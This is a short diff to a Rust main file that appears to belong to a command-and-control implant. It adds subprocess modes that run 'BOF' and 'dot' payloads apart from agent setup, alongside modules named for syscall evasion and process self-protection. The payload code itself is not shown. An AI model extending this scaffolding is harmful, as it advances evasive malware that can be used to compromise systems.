@@ -18,13 +18,26 @@ mod features {
 }
 mod hellshall;
 mod selfprotect;
+mod worker;
 
 use std::{thread, time::Duration};
 
-
-
-
 fn main() {
+    // Worker subprocess mode — run payload and exit without any agent init.
+    let args: Vec<String> = std::env::args().collect();
+    if args.len() >= 2 {
+        match args[1].as_str() {
+            "--worker-bof" => {
+                worker::run_bof_worker();
+                return;
+            }
+            "--worker-dot" => {
+                worker::run_dot_worker();
+                return;
+            }
+            _ => {}
+        }
+    }
 
     selfprotect::set_process_security_descriptor();
 
